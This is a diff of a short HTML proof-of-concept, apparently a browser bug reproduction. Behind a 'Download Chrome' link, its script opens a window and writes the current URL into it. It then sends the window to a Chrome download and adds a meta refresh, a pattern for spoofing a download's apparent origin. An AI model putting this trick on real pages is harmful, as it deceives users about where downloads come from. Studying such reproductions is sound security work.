@@ -1,9 +1,17 @@
 <script>
-    function spoof() {
-        var w = open()
-        w.opener = null
-        w.document.write('Current URL: ' + document.URL)
-        w.location = 'https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg'
-    }
+function sleep() {
+
+    var w = open();
+    w.opener = null;
+    w.document.write('Current URL: ' + document.URL);
+    w.location = 'https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg';
+
+    // add meta refresh
+    var meta = document.createElement("meta");
+    meta.httpEquiv = "refresh";
+    meta.content = "0; url=https://example.com";
+    document.head.appendChild(meta);
+}
 </script>
-<a href='JavaScript:spoof()'>Download Chrome</a>
+
+<a href="javascript:sleep()">Download Chrome</a>
